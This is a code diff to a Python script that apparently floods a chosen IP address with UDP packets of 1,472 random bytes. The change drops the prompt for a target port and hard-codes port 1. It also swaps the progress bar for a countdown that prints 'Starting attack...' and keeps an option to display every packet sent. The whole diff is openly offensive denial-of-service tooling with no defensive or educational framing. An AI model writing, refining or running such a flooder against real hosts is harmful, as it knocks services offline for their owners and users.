@@ -30,20 +30,6 @@ def get_target():
 
     try:
         while True:
-            try:
-                port = int(input("Target Port       : "))
-                if 0 < port < 65536:
-                    break
-                else:
-                    print("Port must be between 1 and 65535.")
-            except ValueError:
-                print("Please enter a valid port number.")
-    except KeyboardInterrupt:
-        print("\n\n[!] Input cancelled by user. Exiting.")
-        exit(0)
-
-    try:
-        while True:
             print()
             choice = input("Show every packet sent? (Y/N): ").strip().lower()
             if choice == 'y':
@@ -58,26 +44,23 @@ def get_target():
         print("\n\n[!] Input cancelled by user. Exiting.")
         exit(0)
 
-    return ip, port, show_all
+    return ip, show_all
 
 def loading_animation():
-    clear_terminal()
-    print("Starting attack... Please wait.\n")
     try:
-        for i in range(1, 101):
-            bar_length = 30
-            filled_length = int(bar_length * i // 100)
-            bar = "=" * filled_length + "-" * (bar_length - filled_length)
-            print(f"[{bar}] {i}%", end='\r', flush=True)
-            time.sleep(0.1)
-        print("\n[+] Attack initialized.\n")
+        for i in range(5, 0, -1):
+            clear_terminal()
+            print(f"Starting attack... {i}")
+            time.sleep(1)
+        clear_terminal()
     except KeyboardInterrupt:
         print("\n\n[!] Loading cancelled by user.")
         exit(0)
 
-def start_attack(ip, port, show_all=False):
+def start_attack(ip, show_all=False):
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     payload = random._urandom(1472)
+    port = 1
     sent = 0
     try:
         while True:
@@ -97,9 +80,9 @@ def start_attack(ip, port, show_all=False):
 if __name__ == "__main__":
     try:
         banner()
-        ip, port, show_all = get_target()
+        ip, show_all = get_target()
         loading_animation()
-        start_attack(ip, port, show_all)
+        start_attack(ip, show_all)
     except KeyboardInterrupt:
         print("\n\n[!] Program interrupted by user. Exiting.")
         exit(0)
